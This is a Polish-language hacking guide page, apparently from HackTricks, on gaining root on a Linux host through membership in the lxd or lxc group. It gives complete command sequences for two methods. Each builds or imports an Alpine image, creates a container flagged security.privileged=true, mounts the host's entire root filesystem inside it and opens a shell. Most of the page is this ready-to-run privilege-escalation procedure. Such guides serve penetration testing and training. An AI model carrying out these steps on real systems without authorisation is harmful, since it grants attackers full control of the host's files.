# lxd/lxc Group - Podwyższenie uprawnień

{{#include ../../../banners/hacktricks-training.md}}

Jeśli należysz do grupy _**lxd**_ **lub** _**lxc**_, możesz stać się rootem

## Wykorzystanie bez internetu

### Metoda 1

Możesz pobrać obraz alpine do użycia z lxd z zaufanego repozytorium. Canonical publikuje codzienne wersje na swojej stronie: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) Po prostu pobierz zarówno **lxd.tar.xz**, jak i **rootfs.squashfs** z najnowszej wersji. (Nazwa katalogu to data).

Alternatywnie możesz zainstalować na swoim komputerze to narzędzie do budowy dystrybucji: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (postępuj zgodnie z instrukcjami na githubie):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Prześlij pliki **incus.tar.xz** (**lxd.tar.xz**, jeśli pobrałeś z repozytorium Canonical) oraz **rootfs.squashfs**, dodaj obraz do repozytorium i utwórz kontener:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Jeśli napotkasz ten błąd _**Błąd: Nie znaleziono puli pamięci. Proszę utworzyć nową pulę pamięci**_\
> Uruchom **`lxd init`** i skonfiguruj wszystkie opcje na domyślne. Następnie **powtórz** poprzedni zestaw poleceń

Na koniec możesz uruchomić kontener i uzyskać dostęp do roota:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metoda 2

Zbuduj obraz Alpine i uruchom go z flagą `security.privileged=true`, zmuszając kontener do interakcji jako root z systemem plików hosta.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
